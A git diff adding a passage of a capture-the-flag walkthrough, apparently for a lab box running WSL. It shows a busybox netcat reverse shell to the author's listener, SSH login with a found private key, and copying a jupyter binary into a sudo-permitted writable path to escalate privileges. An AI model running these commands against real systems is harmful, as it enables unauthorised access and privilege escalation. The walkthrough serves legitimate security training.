@@ -50,3 +50,57 @@ But let's go with the terminal option
 Click on the *new button* then click the *terminal button*
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7fc0bd07-3196-4a6d-9bd6-6695bc41e21f)
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4958278f-f2f6-458a-b39c-f48fed665167)
+
+I just got a reverse shell using *busybox* binary
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/43e343d2-1f66-49b3-9fb4-0199593dc0f8)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64553ac3-75c2-4d97-8338-41d227cb7b19)
+
+```
+Command: busybox nc 10.2.42.156 1337 -e /bin/bash
+```
+
+From here we see that this is a linux host
+
+But our nmap scan showed that this is a windows box 
+
+So the only thing we can think of is that this is a host running [wsl](https://learn.microsoft.com/en-us/windows/wsl/install)
+
+Looking at the current working directory we can see a ssh key for user *dev-datasci-lowpriv*
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f8c7c1ed-34b8-4272-86bb-c2aa9a8d287b)
+
+We can try login to ssh cause it works 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3eb644cd-c349-4dac-be61-9fe268d47bf5)
+
+```
+Command:-
+chmod 600 id_rsa
+ssh -i id_rsa dev-datasci-lowpriv@10.10.195.131
+```
+
+Let's see if we can root the wsl host because if that works we can just mount the windows host and access the administrator directory 
+
+Also i'm taking this path cause i suck at privesc in windows 😄
+
+Checking *sudo* permission on the wsl shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/843301ef-3f6b-44ac-afb8-2dbe2cb16308)
+
+Interesting we can run */home/dev-datasci/.local/bin/jupyter* as root that looks to easy already 🙂
+
+But trying it doesn't work
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e06c24fe-f20f-4532-99bf-4c1f25d3d0c8)
+
+We get *command not found* and that is because the binary isn't in that specific path smh
+
+I used *find* command then got the binary
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f7909af-3e5e-4cac-b62f-5b56d05be07b)
+
+```
+Command: find / -type f -name jupyter 2>/dev/null
+```
+
+Now we can just copy the binary to that path since we have write access *cause /home/dev-datasci/.local* is owned by us
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/761d9d35-f591-4dac-8aed-f3cca7cfc6db)
+
+```
+Command: cp /home/dev-datasci/anaconda3/bin/jupyter /home/dev-datasci/.local/bin/jupyter
+```
